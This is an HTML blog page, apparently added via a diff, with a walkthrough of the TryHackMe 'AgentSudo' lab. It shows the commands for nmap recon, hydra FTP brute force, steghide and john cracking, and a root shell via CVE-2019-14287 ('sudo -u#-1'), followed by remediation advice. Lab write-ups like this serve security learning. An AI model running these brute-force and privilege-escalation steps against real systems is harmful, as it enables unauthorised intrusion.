@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="A walkthrough of the AgentSudo machine on TryHackMe, a Linux box requiring exploitation of information disclosure vulnerabilities and a sudo authentication bypass (CVE-2019-14287) for privilege escalation.">
+<meta name="author" content="Saurabh Jain">
+<title>AgentSudo Write-Up: TryHackMe Machine Walk-through · Saurabh Jain</title>
+
+
+<meta property="og:type"        content="article">
+<meta property="og:title"       content="AgentSudo Write-Up: TryHackMe Machine Walk-through">
+<meta property="og:description" content="A walkthrough of the AgentSudo machine on TryHackMe, a Linux box requiring exploitation of information disclosure vulnerabilities and a sudo authentication bypass (CVE-2019-14287) for privilege escalation.">
+<meta property="og:url"         content="http://localhost:1313/posts/agentsudo-tryhackme-walkthrough/">
+<meta property="og:site_name"   content="Saurabh Jain">
+
+<meta property="og:image"       content="https://miro.medium.com/v2/resize:fit:828/1*ZwI1k9l-zpRWnvBoK4UIqA.png">
+<meta name="twitter:image"      content="https://miro.medium.com/v2/resize:fit:828/1*ZwI1k9l-zpRWnvBoK4UIqA.png">
+
+
+<meta property="article:published_time" content="2022-01-09T00:00:00Z">
+<meta property="article:tag" content="tryhackme"><meta property="article:tag" content="hacking"><meta property="article:tag" content="privilege-escalation">
+
+
+
+<meta name="twitter:card"        content="summary_large_image">
+<meta name="twitter:title"       content="AgentSudo Write-Up: TryHackMe Machine Walk-through">
+<meta name="twitter:description" content="A walkthrough of the AgentSudo machine on TryHackMe, a Linux box requiring exploitation of information disclosure vulnerabilities and a sudo authentication bypass (CVE-2019-14287) for privilege escalation.">
+
+
+<link rel="canonical" href="https://saurabh-jain.medium.com/agentsudo-write-up-tryhackme-machine-walk-through-b270937a817e">
+
+
+<link rel="alternate" type="application/rss+xml" href="/index.xml" title="Saurabh Jain">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Lora:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script>
+  (function(){
+    var t=localStorage.getItem('sj-theme')||
+      (window.matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');
+    document.documentElement.setAttribute('data-theme',t);
+  })();
+</script>
+
+
+</head>
+<body>
+  <div id="reading-progress"></div>
+  <header class="site-header">
+  <div class="header-inner">
+    <a href="/" class="site-brand">
+      <span class="brand-name">Saurabh Jain</span>
+      <span class="brand-tagline">Security · Cloud · Bug Bounty</span>
+    </a>
+
+    <nav class="site-nav" id="nav-menu">
+      <a href="/about/">About</a>
+      <a href="/search/" class="nav-icon" aria-label="Search">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </a>
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
+        
+        <svg class="icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+        
+        <svg class="icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+      </button>
+    </nav>
+
+    <button class="nav-hamburger" id="nav-toggle" aria-label="Open menu">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+</header>
+
+  <main class="site-main">
+<div class="container">
+  <div class="post-layout has-toc">
+
+    
+    
+    <aside class="post-toc">
+      <div class="toc-sticky">
+        <p class="toc-label">Contents</p>
+        <nav class="toc-nav"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-initial-reconnaissance">Step 1: Initial Reconnaissance</a></li>
+    <li><a href="#step-2-web-enumeration">Step 2: Web Enumeration</a></li>
+    <li><a href="#step-3-ftp-brute-force">Step 3: FTP Brute Force</a></li>
+    <li><a href="#step-4-steganography">Step 4: Steganography</a></li>
+    <li><a href="#step-5-initial-access">Step 5: Initial Access</a></li>
+    <li><a href="#step-6-privilege-escalation--cve-2019-14287">Step 6: Privilege Escalation — CVE-2019-14287</a></li>
+    <li><a href="#remediation">Remediation</a></li>
+    <li><a href="#key-takeaways">Key Takeaways</a></li>
+  </ul>
+</nav></nav>
+      </div>
+    </aside>
+    
+
+    
+    <article class="post-content">
+
+      
+      <header class="post-header">
+        
+        <div class="post-tags"><a class="tag" href="/tags/tryhackme">tryhackme</a><a class="tag" href="/tags/hacking">hacking</a><a class="tag" href="/tags/privilege-escalation">privilege-escalation</a></div>
+        
+        <h1 class="post-title">AgentSudo Write-Up: TryHackMe Machine Walk-through</h1>
+        <p class="post-subtitle">A walkthrough of the AgentSudo machine on TryHackMe, a Linux box requiring exploitation of information disclosure vulnerabilities and a sudo authentication bypass (CVE-2019-14287) for privilege escalation.</p>
+        <div class="post-byline">
+          <img class="byline-avatar" src="https://github.com/saurabhj4in.png" alt="Saurabh Jain" loading="lazy">
+          <div class="byline-info">
+            <span class="byline-author">Saurabh Jain</span>
+            <div class="byline-meta">
+              <time>January 9, 2022</time>
+              <span class="dot">·</span>
+              <span>2 min read</span>
+              
+              <span class="dot">·</span>
+              <a href="https://saurabh-jain.medium.com/agentsudo-write-up-tryhackme-machine-walk-through-b270937a817e" target="_blank" rel="noopener">View on Medium ↗</a>
+              
+            </div>
+          </div>
+        </div>
+      </header>
+
+      
+      
+      <img class="post-cover-img" src="https://miro.medium.com/v2/resize:fit:828/1*ZwI1k9l-zpRWnvBoK4UIqA.png" alt="AgentSudo Write-Up: TryHackMe Machine Walk-through" loading="eager">
+      
+
+      
+      
+<div class="medium-banner">
+  <svg width="20" height="20" viewBox="0 0 195 195" fill="currentColor"><ellipse cx="55" cy="97.5" rx="55" ry="55"/><ellipse cx="149.5" cy="97.5" rx="29.5" ry="52"/><ellipse cx="186.5" cy="97.5" rx="8.5" ry="45"/></svg>
+  <span>Originally published on Medium — <a href="https://saurabh-jain.medium.com/agentsudo-write-up-tryhackme-machine-walk-through-b270937a817e" target="_blank" rel="noopener">read there for comments &amp; claps →</a></span>
+</div>
+
+
+
+      
+      <div class="post-body"><p>AgentSudo is a Linux-based machine on TryHackMe that covers information disclosure, steganography, and a critical sudo vulnerability. Dynamic IP assignments mean your address will differ from this walkthrough.</p>
+<h2 id="overview">Overview</h2>
+<p>The machine has two main phases:</p>
+<ol>
+<li><strong>User shell:</strong> Exploit information disclosure to gain credentials</li>
+<li><strong>Root:</strong> Exploit CVE-2019-14287, a sudo authentication bypass</li>
+</ol>
+<h2 id="step-1-initial-reconnaissance">Step 1: Initial Reconnaissance</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -sC -oN agentsudo.txt &lt;target-ip&gt;
+</span></span></code></pre></div><p>Common open ports on this machine:</p>
+<ul>
+<li><strong>21/tcp</strong> — FTP</li>
+<li><strong>22/tcp</strong> — SSH</li>
+<li><strong>80/tcp</strong> — HTTP (Apache web server)</li>
+</ul>
+<h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>
+<p>Visit the HTTP service. The page hints at using a &ldquo;codename&rdquo; as your user-agent to get a special response. Fuzzing the <code>User-Agent</code> header reveals a redirect that leaks information about the number of agents on the system.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -A <span class="s2">&#34;C&#34;</span> http://&lt;target-ip&gt;/ -L
+</span></span></code></pre></div><p>This information disclosure reveals a username hint and points to the FTP service.</p>
+<h2 id="step-3-ftp-brute-force">Step 3: FTP Brute Force</h2>
+<p>Using the discovered username, brute force the FTP credentials:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt ftp://&lt;target-ip&gt;
+</span></span></code></pre></div><p>Once in, download all available files — look for images that may contain hidden data.</p>
+<h2 id="step-4-steganography">Step 4: Steganography</h2>
+<p>Images on the FTP server contain hidden messages. Use steghide to extract them:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">steghide extract -sf &lt;image-file&gt;
+</span></span></code></pre></div><p>The passphrase can be found by cracking a zip file found alongside the images using John the Ripper:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip2john &lt;file&gt;.zip &gt; hash.txt
+</span></span><span class="line"><span class="cl">john hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>The extracted data contains SSH credentials.</p>
+<h2 id="step-5-initial-access">Step 5: Initial Access</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh &lt;username&gt;@&lt;target-ip&gt;
+</span></span></code></pre></div><p>You now have user-level shell. Grab the user flag.</p>
+<h2 id="step-6-privilege-escalation--cve-2019-14287">Step 6: Privilege Escalation — CVE-2019-14287</h2>
+<p>Check sudo permissions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -l
+</span></span></code></pre></div><p>The output shows something like:</p>
+<pre tabindex="0"><code>(ALL, !root) /bin/bash
+</code></pre><p>This means the user can run <code>/bin/bash</code> as any user <strong>except root</strong>. However, CVE-2019-14287 bypasses this restriction. When sudo is configured with <code>!root</code>, specifying user ID <code>-1</code> or <code>4294967295</code> is treated as root:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -u#-1 /bin/bash
+</span></span></code></pre></div><p>You now have a root shell.</p>
+<p><strong>PoC on ExploitDB:</strong> <a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
+<h2 id="remediation">Remediation</h2>
+<p><strong>Upgrade sudo</strong> — this affects versions prior to 1.8.28. Patch immediately:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get upgrade sudo
+</span></span></code></pre></div><p><strong>Avoid <code>!root</code> rules</strong> — if you need to restrict root access, redesign the policy rather than using negation in sudoers.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Vulnerable sudoers rule</span>
+</span></span><span class="line"><span class="cl">james <span class="nv">ALL</span><span class="o">=(</span>ALL, !root<span class="o">)</span> /bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Safer approach: explicitly list allowed users</span>
+</span></span><span class="line"><span class="cl">james <span class="nv">ALL</span><span class="o">=(</span>www-data<span class="o">)</span> /bin/bash
+</span></span></code></pre></div><h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li><strong>Information disclosure is underrated</strong> — a leaked username or file list is often the first domino</li>
+<li><strong>Steganography is used in real attacks</strong> — data exfiltration in images bypasses many DLP controls</li>
+<li><strong>CVE-2019-14287 was critical</strong> — negation rules in sudoers were widely trusted but broken</li>
+<li><strong>Always patch sudo</strong> — it runs as root; a vulnerability here is always severe</li>
+</ol>
+<hr>
+<p><em>TryHackMe room: <a href="https://tryhackme.com/room/agentsudoctf">AgentSudo</a></em></p>
+</div>
+
+      <hr class="post-divider">
+
+      
+      
+      <div class="post-tags-footer">
+        <span class="tags-label">Topics:</span>
+        <a class="tag" href="/tags/tryhackme">tryhackme</a><a class="tag" href="/tags/hacking">hacking</a><a class="tag" href="/tags/privilege-escalation">privilege-escalation</a>
+      </div>
+      
+
+      
+      
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+
+
+
+
+<section class="related-section">
+  <h2 class="related-title">You might also like</h2>
+  <div class="related-grid">
+    
+    
+    <a class="related-card" href="http://localhost:1313/posts/ohsint-tryhackme-walkthrough/">
+      
+      <img class="related-img" src="https://miro.medium.com/v2/da:true/resize:fit:1200/0*ifPp3aIaS92zqJZF" alt="" loading="lazy">
+      
+      <div class="related-body">
+        <span class="tag">tryhackme</span>
+        <h3 class="related-card-title">OhSINT TryHackMe Walkthrough</h3>
+        <span class="related-meta">Oct 28, 2024 · 2 min</span>
+      </div>
+    </a>
+    
+    
+    
+    <a class="related-card" href="http://localhost:1313/posts/tomghost-tryhackme-walkthrough/">
+      
+      <img class="related-img" src="https://miro.medium.com/v2/resize:fit:1088/1*x5yscQ9QnXBayb5_F3uFMw.png" alt="" loading="lazy">
+      
+      <div class="related-body">
+        <span class="tag">tryhackme</span>
+        <h3 class="related-card-title">TomGhost Write-Up: TryHackMe Walk-through</h3>
+        <span class="related-meta">Nov 9, 2021 · 2 min</span>
+      </div>
+    </a>
+    
+    
+    
+    <a class="related-card" href="http://localhost:1313/posts/cap-hackthebox-walkthrough/">
+      
+      <img class="related-img" src="https://miro.medium.com/v2/resize:fit:791/1*8T_XCFg5mvf1pACOllyP2Q.png" alt="" loading="lazy">
+      
+      <div class="related-body">
+        <span class="tag">hackthebox</span>
+        <h3 class="related-card-title">Cap Walk-through: HackTheBox Machine Write-up</h3>
+        <span class="related-meta">Oct 19, 2021 · 2 min</span>
+      </div>
+    </a>
+    
+    
+  </div>
+</section>
+
+
+
+      
+      
+<section class="comments-section comments-disabled">
+  <div class="comments-placeholder">
+    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <p>Comments coming soon via Giscus.</p>
+    <a href="https://saurabh-jain.medium.com/" target="_blank" rel="noopener">Discuss this on Medium →</a>
+  </div>
+</section>
+
+
+
+      
+      <nav class="post-nav">
+        
+        <a class="post-nav-link prev" href="http://localhost:1313/posts/bountyhunter-hackthebox-walkthrough/">
+          <span class="nav-label">← Previous</span>
+          <span class="nav-title">BountyHunter Walkthrough: HackTheBox Writeup</span>
+        </a>
+        
+        
+        <a class="post-nav-link next" href="http://localhost:1313/posts/cors-doesnt-apply-to-mobile-apps/">
+          <span class="nav-label">Next →</span>
+          <span class="nav-title">Security Beyond Browsers: Why CORS Doesn&#39;t Apply to Mobile Applications</span>
+        </a>
+        
+      </nav>
+
+      <div class="back-link"><a href="/">← All posts</a></div>
+
+    </article>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+
+  </main>
+  <footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <span class="brand-name">Saurabh Jain</span>
+        <p class="footer-bio">Security engineer writing about cloud security, bug bounties, AWS, and the grey areas no one puts on a slide deck.</p>
+      </div>
+      <div class="footer-links-group">
+        <p class="footer-group-title">Writing</p>
+        <a href="/posts/">All Posts</a>
+        <a href="/tags/">Topics</a>
+        <a href="/index.xml">RSS Feed</a>
+      </div>
+      <div class="footer-links-group">
+        <p class="footer-group-title">Connect</p>
+        <a href="https://saurabh-jain.medium.com/" target="_blank" rel="noopener">Medium</a>
+        <a href="https://www.linkedin.com/in/saurabh-jain-503991165/" target="_blank" rel="noopener">LinkedIn</a>
+        <a href="https://github.com/saurabhj4in" target="_blank" rel="noopener">GitHub</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2026 Saurabh Jain · Built with Hugo · Hosted on GitHub Pages</p>
+    </div>
+  </div>
+</footer>
+
+  <script src="/js/main.js"></script>
+  
+  
+</body>
+</html>
